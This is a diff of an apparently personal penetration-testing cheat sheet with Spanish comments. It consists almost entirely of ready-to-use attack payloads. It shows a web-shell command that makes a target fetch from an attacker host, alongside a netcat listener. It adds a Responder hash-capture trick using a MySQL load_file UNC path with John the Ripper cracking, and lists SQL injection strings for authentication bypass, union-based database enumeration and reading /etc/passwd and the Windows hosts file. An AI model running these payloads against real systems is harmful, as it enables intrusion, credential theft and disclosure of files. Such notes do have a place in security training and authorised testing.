@@ -7,18 +7,24 @@ curl 'http://192.168.100.1:8080/shell.php?cmd=curl%20http%3A%2F%2F10.50.155.7%3A
 A> sudo rlwrap nc -lvnp 53
 A> python3 -m http.server 8000
 
+# mysql responder hash attack
+responder -I tun0
+1' union select 1,load_file('////IP_A/RECURSO'),1-- -
+john ntlmv2.hash --wordlists=diccionario
+
 # sqlite
 1'-- -
 admin'-- -
 and 1 = 1
 and 2 = 1 union select 1,2,3
 
-order by 100;
+1' order by 100-- -
 
 union select 1,2,3,4;
 union select 1,2,3,database();
 union select 1,2,3,user();
-union select 1,2,3,load_file('/etc/passwd');
+union select 1,2,3,load_file('/etc/passwd'); # test LFI
+union select 1,load_file('C://windows//system32/drivers/etc/hosts'),1 -- - # test LFI
 union select schema_name,2,3,4 from information_schema.schemata; **muestra todas las db**
 
 union select schema_name,2,3,4 from information_schema.schemata limit 1,1; **para forzar que muestre las db**
